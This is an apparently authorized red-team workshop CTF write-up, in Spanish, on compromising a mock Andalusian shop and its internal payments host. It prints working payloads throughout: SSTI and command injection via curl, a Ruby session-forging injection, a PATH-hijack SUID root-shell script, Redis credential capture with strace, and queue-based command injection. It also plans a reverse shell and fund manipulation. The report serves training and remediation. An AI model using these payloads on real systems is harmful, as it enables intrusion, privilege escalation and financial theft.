# initg Red Team Workshop — "La Despensa Malagueña" Shop CTF

**Autor:** Vicente (Student #46)
**Entorno:** Red Team Workshop autorizado, infraestructura gestionada por los organizadores (`*.rt.initg.dev`, GCP)
**Rol:** Pentest ofensivo de caja negra/gris contra una aplicación e-commerce de laboratorio, con objetivo final financiero ("Obtain Money")
**Estado:** Cadena de explotación completa hasta RCE + movimiento lateral confirmado en el sistema de pagos interno. El paso final de manipulación de fondos quedó **en curso** al cierre de esta sesión (ver [Estado y próximos pasos](#estado-y-próximos-pasos)).

> ⚠️ **Nota de responsabilidad:** este informe documenta un ejercicio autorizado dentro de un workshop de formación. Todas las credenciales, IPs internas y datos específicos de la instancia han sido **redactados o sustituidos por placeholders** antes de publicarse, ya que la infraestructura es compartida/reutilizada entre cohortes de estudiantes. El código y la metodología se mantienen intactos con fines educativos.

---

## Índice

1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Alcance y reglas de la prueba](#alcance-y-reglas-de-la-prueba)
3. [Metodología y cronología](#metodología-y-cronología)
4. [Hallazgos](#hallazgos)
5. [Cadena de explotación completa](#cadena-de-explotación-completa)
6. [Herramientas desarrolladas](#herramientas-desarrolladas)
7. [Flags capturadas](#flags-capturadas)
8. [Estado y próximos pasos](#estado-y-próximos-pasos)
9. [Recomendaciones de remediación](#recomendaciones-de-remediación)
10. [Lecciones aprendidas](#lecciones-aprendidas)

---

## Resumen ejecutivo

El objetivo del reto era comprometer una tienda online ficticia ("La Despensa Malagueña") y, siguiendo el rastro técnico, llegar hasta un sistema financiero interno para demostrar impacto económico real (transferencia/reembolso), no solo obtención de shell o root.

A partir de una única vulnerabilidad de inyección en un formulario de "solicitar cupón" (sin autenticación), se construyó una cadena completa de compromiso:

| Fase | Resultado |
|---|---|
| Recon | Mapeo de la app (Sinatra/Ruby), descubrimiento de endpoints ocultos |
| Explotación inicial | RCE no autenticado vía SSTI + Command Injection |
| Bypass de autenticación | Creación/forja de sesión de usuario sin pasar por login (deshabilitado a propósito) |
| Escalada de privilegios | Root vía secuestro de `PATH` en binario SUID mal configurado |
| Movimiento lateral | Descubrimiento y compromiso de un host interno de pagos (`payments.internal`) vía credenciales de Redis capturadas en tránsito |
| Objetivo de negocio | RCE confirmado en el propio sistema de pagos (usuario con `sudo`), a un paso de manipular transacciones reales |

**Severidad global: Crítica.** La vulnerabilidad inicial (sin autenticación, sin interacción de usuario) permite comprometer toda la cadena de confianza hasta el sistema financiero.

---

## Alcance y reglas de la prueba

- **Target autorizado:** `target46.rt.initg.dev` (tienda) y, por descubrimiento durante la prueba, `payments.internal` (sistema de pagos interno, solo accesible desde la red del laboratorio).
- **Workstation de origen:** `workstation46.rt.initg.dev`, provisto por los organizadores.
- **Autorización:** ejercicio explícitamente diseñado y habilitado por los organizadores del workshop para practicar red teaming ofensivo con objetivo financiero simulado.
- **Fuera de alcance:** cualquier sistema no perteneciente a la infraestructura del workshop.

---

## Metodología y cronología

### 1. Reconocimiento de red

```bash
nmap -Pn -sC -sV -p- -T4 target46.rt.initg.dev
```

Resultado: solo dos puertos expuestos.

| Puerto | Servicio |
|---|---|
| 22/tcp | OpenSSH 9.6p1 |
| 8888/tcp | HTTPS — aplicación Ruby (Sinatra) bajo Puma, con certificado autofirmado |

Una sonda genérica de `nmap` contra el puerto 8888 disparó un **error 500 con stack trace completo**, filtrando:
- Framework y versión exacta: Puma 6.6.1 sobre Ruby 3.2.0.
- Ruta absoluta de despliegue de la app (`/opt/shop_app/`).

*(Hallazgo F1 — ver tabla de hallazgos)*

### 2. Reconocimiento de la aplicación web

La aplicación es una tienda de productos andaluces con una característica de desarrollo dejada activa a propósito: **cada página expone su propio código fuente** (botón "Inspect Code" / "Ver las Tripas"), lo que aceleró enormemente el análisis de la lógica de negocio sin necesidad de descompilar nada.

Enumeración de directorios (`gobuster` con diccionario de `dirb` + lista propia de términos de e-commerce) reveló rutas no enlazadas desde el HTML:

```
/admin      → 302 a /login (protegida)
/cart       → 302 a /login (protegida)
/settings   → 302 a /login (protegida)
/coupon     → 200 OK, SIN protección de sesión
```

### 3. Explotación inicial

El código fuente de `/coupon` (visible gracias a la función "Ver las Tripas") reveló:

```ruby
post '/coupon' do
  email = params[:email]
  system("bash -c \"echo User #{email} requested a coupon. >> /tmp/coupon_requests.log\"")
  @confirmation_message = t(:coupon_confirmation, email: email)
  erb :coupon
end
```

Dos vulnerabilidades en el mismo endpoint:

- **OS Command Injection** (el parámetro `email` se interpola sin sanitizar dentro de un `system()`).
- **SSTI (Server-Side Template Injection)** vía ERB: el mensaje de confirmación se construye con el `email` del usuario y luego se **vuelve a evaluar como plantilla ERB** (`ERB.new(@confirmation_message).result(binding)`), un patrón de doble evaluación que permite ejecutar **Ruby arbitrario**, no solo comandos de shell.

Prueba de concepto (inofensiva):

```bash
curl -sk -X POST https://target46.rt.initg.dev:8888/coupon \
  --data-urlencode 'email=<%= 7*7 %>'
# → el mensaje de confirmación devuelve "49", confirmando ejecución de código Ruby real
```

Escalada a ejecución de comandos de sistema:

```bash
curl -sk -X POST https://target46.rt.initg.dev:8888/coupon \
  --data-urlencode 'email=<%= %x(id) %>'
# → uid=1001(shop_app_user) gid=1002(shop_app_user)
```

🚩 **FLAG 1** obtenida leyendo un fichero del directorio de la app, confirmando el punto de entrada:
`FLAG{c0up0n_c0mm4nd_1nj3ct10n}`

### 4. Bypass de autenticación (sin usar la vulnerabilidad de login)

El código de `/login` y `/register` estaba **intencionadamente deshabilitado** (lógica real comentada, siempre redirige con un error). Sin embargo, al tratarse de ejecución de **Ruby real** (no solo shell), se pudo:

1. Instanciar un usuario directamente con el método `User.create(...)` del modelo (que seguía siendo funcional, solo la *ruta HTTP* estaba apagada).
2. Escribir directamente en el objeto de sesión de la petición: `session[:user_id] = usuario.id`.
3. Leer la clave de acceso de administrador (`AppConfig.admin_access_key`), también accesible como atributo de clase público, y calcular el token Base64 esperado por `/admin`.

Todo en una sola inyección:

```bash
curl -sk -c cookies.txt -X POST https://target46.rt.initg.dev:8888/coupon \
  --data-urlencode "email=<%= (u = User.create(username: 'REDACTED_USER', password: 'REDACTED_PASS'); session[:user_id] = u.id; Base64.strict_encode64(u.username + AppConfig.admin_access_key)) %>"
```

Resultado: sesión autenticada forjada + acceso al panel `/admin`, sin pasar nunca por un formulario de login real. *(Hallazgo F4)*

### 5. Escalada de privilegios a root

Enumeración de binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Reveló `/home/shop_app_user/app_monitor` — un binario **no estándar** del sistema, con bit SUID de root. Análisis (`strings` + ejecución) mostró su comportamiento:

```c
setuid(0);
system("systemctl status shop_app");   // llamada SIN ruta absoluta
```

Clásico **secuestro de `PATH`**: al no limpiar el entorno antes de invocar `system()`, basta con anteponer un directorio controlado por el atacante al `PATH` y colocar ahí un ejecutable llamado `systemctl`.

```bash
# "systemctl" falso
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/systemctl
chmod +x /tmp/systemctl

# disparo del hijack
PATH=/tmp:$PATH /home/shop_app_user/app_monitor

# verificación
/tmp/rootbash -p -c id
# → euid=0(root)
```

🚩 **FLAG 2**: `FLAG{p4th_h1j4ck_pr1v_3sc}`

### 6. Movimiento lateral — descubrimiento del sistema de pagos

Con shell de root en el target, `/etc/hosts` reveló un host interno **no visible desde el exterior ni desde la red del workstation**:

```
REDACTED_IP  payments.internal
```

Escaneo interno (desde el propio target, que sí tiene ruta de red hacia ese host) encontró Redis (puerto 6379) **con autenticación activada**.

Búsqueda de binarios/artefactos relacionados reveló `/opt/scripts/sync_payments` — un binario compilado en C que usa `hiredis` para autenticarse contra Redis y ejecutar `LPUSH transactions <json>`, con la contraseña **ofuscada en el binario mediante XOR** (no en texto plano en disco).

En lugar de invertir el cifrado, se interceptó el tráfico de red real con `strace`, ya que el protocolo Redis viaja sin TLS:

```bash
strace -f -e trace=network,write -s 500 /opt/scripts/sync_payments payments.internal
```

```
sendto(..., "*2\r\n$4\r\nAUTH\r\n$Nr\n<REDACTED_PASSWORD>\r\n", ...)
sendto(..., "*3\r\n$5\r\nLPUSH\r\n$12\r\ntransactions\r\n...
  {\"user\": \"shop_user\", \"action\": \"purchase\", \"item_id\": 123, \"notes\": \"Daily sync\"}...")
```

La contraseña de Redis quedó expuesta en texto plano en el propio tráfico generado por la herramienta legítima del sistema. *(Hallazgo F6)*

### 7. RCE en el sistema de pagos vía inyección en cola de mensajes

Con la contraseña capturada, se conectó directamente a Redis (sin depender del binario original) y se empujaron transacciones propias a la cola `transactions`. Un worker en `payments.internal` consume esa cola y genera un "informe de transacción" reflejando el campo `notes` recibido.

Prueba de inyección:

```bash
redis-cli -h payments.internal -p 6379 -a '<REDACTED_PASSWORD>' --no-auth-warning \
  LPUSH transactions '{"user": "REDACTED", "action": "purchase", "item_id": 1, "notes": "test_$(id)_end"}'

redis-cli -h payments.internal -p 6379 -a '<REDACTED_PASSWORD>' --no-auth-warning GET last_transaction_report
```

Resultado:

```
bash: -c: line 1: syntax error near unexpected token `('
bash: -c: line 1: `echo Transaction report for test_uid=1000(ubuntu) gid=1000(ubuntu) groups=...,27(sudo),...
```

El `id` se ejecutó **en el servidor de pagos**, confirmando la misma clase de vulnerabilidad (inyección de comandos al construir el informe) que en el punto de entrada original — pero esta vez en la máquina objetivo real, corriendo como el usuario `ubuntu`, miembro del grupo `sudo`. *(Hallazgo F7 — crítico)*

---

## Hallazgos

| ID | Título | Severidad | Componente |
|---|---|---|---|
| F1 | Fuga de información (stack trace / ruta de despliegue) ante petición HTTP malformada | Baja | `target46:8888` |
| F2 | Ausencia de protección CSRF en formularios de escritura | Media | App Sinatra |
| F3 | **Command Injection + SSTI no autenticados en `POST /coupon`** | **Crítica** | App Sinatra — `/coupon` |
| F4 | Control de acceso roto: lógica de login/admin bypasseable ejecutando código Ruby directamente sobre los modelos | **Alta** | App Sinatra |
| F5 | **Binario SUID con `system()` vulnerable a secuestro de `PATH`** | **Crítica** | `/home/shop_app_user/app_monitor` |
| F6 | Credenciales de servicio interno (Redis) transmitidas en texto plano y extraíbles por interceptación de tráfico local | **Alta** | `payments.internal:6379` |
| F7 | **Command Injection no autenticado en worker de procesamiento de transacciones**, RCE como usuario con `sudo` | **Crítica** | `payments.internal` |

### Detalle F3 — Command Injection + SSTI en `/coupon`

- **Vector:** parámetro `email` del formulario de solicitud de cupón, sin autenticación.
- **Causa raíz:** interpolación directa de entrada de usuario dentro de `system()` y dentro de una plantilla ERB evaluada dos veces.
- **Impacto:** ejecución de código arbitrario como el usuario de la aplicación.
- **PoC:** ver sección de metodología, paso 3.

### Detalle F5 — PATH hijacking en binario SUID

- **Vector:** binario SUID root que invoca `system("systemctl status shop_app")` sin ruta absoluta y sin sanitizar `PATH`.
- **Causa raíz:** confianza implícita en el entorno del proceso que invoca el binario SUID.
- **Impacto:** escalada completa de usuario de aplicación a root.
- **PoC:** ver sección de metodología, paso 5.

### Detalle F7 — RCE en payments.internal

- **Vector:** campo `notes` de las transacciones consumidas desde la cola Redis `transactions`.
- **Causa raíz:** mismo patrón que F3 — construcción insegura de un comando de shell a partir de datos de un mensaje de cola no autenticado/no validado.
- **Impacto:** ejecución de comandos en el sistema financiero real, como usuario con privilegios de `sudo` — máximo impacto posible dentro del alcance del reto.

---

## Cadena de explotación completa

```
Internet / red del workshop
        │
        ▼
POST /coupon (sin auth) ──► SSTI/Command Injection ──► RCE como shop_app_user
        │
        ├──► Ruby arbitrario: User.create() + session[:user_id]= ──► bypass de login
        │                                                            └─► acceso a /admin
        │
        └──► Enumeración SUID ──► app_monitor (PATH hijack) ──► ROOT en target46
                    │
                    ▼
        /etc/hosts revela payments.internal (no visible desde fuera)
                    │
                    ▼
        strace sobre sync_payments ──► credenciales Redis en texto plano
                    │
                    ▼
        LPUSH transactions {"notes": "$(payload)"} ──► Command Injection
                    │
                    ▼
        RCE en payments.internal como usuario `ubuntu` (grupo sudo)
                    │
                    ▼
        [objetivo final: manipulación de transacciones / fondos — en curso]
```

---

## Herramientas desarrolladas

Todos los scripts usados están en [`scripts/`](./scripts), con los valores sensibles sustituidos por variables de entorno o placeholders.

- **`scripts/rce_via_ssti.sh`** — envuelve la inyección SSTI de `/coupon` para ejecutar comandos arbitrarios y recuperar su salida (codificada en Base64 para evitar corrupción por el escapado HTML de la página).
- **`scripts/privesc_path_hijack.sh`** — automatiza la explotación del binario SUID vulnerable.
- **`scripts/port_scan.py`** — escáner de puertos TCP ligero en Python (usado quando `nmap` no estaba disponible en el host comprometido).

---

## Flags capturadas

| Flag | Fase |
|---|---|
| `FLAG{c0up0n_c0mm4nd_1nj3ct10n}` | Explotación inicial (F3) |
| `FLAG{p4th_h1j4ck_pr1v_3sc}` | Escalada de privilegios (F5) |

---

## Estado y próximos pasos

Al cierre de esta sesión de trabajo, la cadena de ataque estaba **confirmada hasta ejecución de comandos en `payments.internal`** (evidenciado por la fuga de la salida de `id` en el informe de transacción), pero **sin confirmación verificada** de una shell interactiva estable de vuelta ni de la manipulación efectiva de un saldo/transacción real — el objetivo final ("Obtain Money") se documenta como **en progreso**, no como completado, para no exagerar el resultado.

Próximos pasos planeados:
1. Diagnosticar por qué la conexión de reverse shell saliente desde `payments.internal` no llegaba al listener (¿firewall de salida restringido a puertos/destinos concretos? probar con un puerto distinto o un canal de exfiltración alternativo, p. ej. HTTP saliente).
2. Una vez con shell estable en `payments.internal`, localizar el almacén real de saldos/cuentas (base de datos, API interna) y entender el modelo de datos de "transacción" más allá del campo `notes`.
3. Diseñar una transacción legítima dentro del esquema esperado (`action`, `item_id`, posible campo de importe) que efectivamente acredite fondos a la cuenta propia, en vez de depender de inyección de comandos para cada paso.

---

## Recomendaciones de remediación

| Hallazgo | Recomendación |
|---|---|
| F1 | Capturar excepciones genéricas y no exponer *stack traces* ni rutas del sistema en producción (`show_exceptions` desactivado). |
| F2 | Añadir protección CSRF estándar (p. ej. `rack-protection` o tokens explícitos) a todos los formularios de escritura. |
| F3 | Nunca interpolar entrada de usuario en `system()`/`` ` ` ``; nunca volver a evaluar una cadena ya interpolada como plantilla (`ERB.new(...).result`). Sanear/escapar siempre, o eliminar el doble renderizado. |
| F4 | No dejar helpers de autenticación deshabilitados "a medias" en código que sigue siendo invocable; eliminar o proteger con *feature flags* reales a nivel de todas las rutas que dependen de sesión. |
| F5 | Fijar `PATH` explícitamente (o usar rutas absolutas) en cualquier binario con bit SUID antes de invocar `system()`/`execve()`; evitar SUID salvo estrictamente necesario, y auditar binarios no estándar en directorios de usuario. |
| F6 | No transmitir credenciales de servicios internos en texto plano, ni siquiera en redes "internas"; usar TLS para Redis (`stunnel`/`redis-cli --tls`) y rotar credenciales si se filtran. |
| F7 | Validar y tipar estrictamente los mensajes consumidos de colas internas; tratar cualquier dato proveniente de una cola como entrada no confiable, igual que una petición HTTP externa. |

---

## Lecciones aprendidas

- Una función de "ver código fuente" dejada activa por error (o a propósito, como ayuda didáctica del reto) puede convertirse en el mejor vector de reconocimiento disponible para un atacante.
- La misma clase de vulnerabilidad (inyección de comandos al construir mensajes/logs a partir de entrada no confiable) puede repetirse en distintos servicios de una misma organización si comparten patrones de código o un mismo equipo de desarrollo — tal y como ocurrió entre la tienda (`/coupon`) y el sistema de pagos (worker de `transactions`).
- Interceptar tráfico de red local (`strace`) es con frecuencia más rápido que intentar revertir ofuscación/cifrado aplicado a una credencial embebida en un binario.
- Documentar la cadena completa en tiempo real (notas estructuradas por hallazgo) fue clave para no perder el hilo en una sesión larga con muchos hallazgos encadenados.

---

*Informe elaborado como ejercicio de formación en el marco de un Red Team Workshop autorizado (initg). Uso exclusivamente educativo.*
